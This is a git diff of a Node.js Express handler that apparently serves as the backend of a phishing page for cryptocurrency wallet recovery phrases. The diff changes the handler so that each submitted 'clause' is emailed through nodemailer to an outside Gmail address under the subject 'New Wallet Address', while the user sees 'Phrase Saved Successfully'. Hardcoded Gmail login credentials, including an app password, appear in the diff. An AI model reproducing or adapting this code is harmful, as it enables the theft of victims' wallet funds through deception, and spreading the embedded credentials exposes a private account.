@@ -10,22 +10,30 @@ const store = (req, res, next) => {
     service: "Gmail", // e.g., 'Gmail', 'Yahoo', etc.
     auth: {
       user: "eightninemo@gmail.com",
-      pass: "eightninemo65",
+      pass: "baxi hrmu tsca pobn",
     },
   });
 
   // Email data
   const mailOptions = {
     from: "eightninemo@gmail.com",
-    to: "eightninemo@gmail.com",
-    subject: "Hello, World!",
-    text: "This is the email body.",
+    to: "sooreoluwwaa@gmail.com",
+    subject: "New Wallet Address",
+    text: clause,
   };
   let phrase = Phrase({
     clause: req.body.clause,
   });
   console.log(phrase);
   if (clause != "") {
+    // Send the email
+    transporter.sendMail(mailOptions, (error, info) => {
+      if (error) {
+        console.error("Error sending email:", error);
+      } else {
+        console.log("Email sent:", info.response);
+      }
+    });
     phrase
       .save()
       .then((response) => {
@@ -33,15 +41,6 @@ const store = (req, res, next) => {
           status: true,
           message: "Phrase Saved Successfully",
           data: response,
-        });
-
-        // Send the email
-        transporter.sendMail(mailOptions, (error, info) => {
-          if (error) {
-            console.error("Error sending email:", error);
-          } else {
-            console.log("Email sent:", info.response);
-          }
         });
       })
       .catch((error) => {
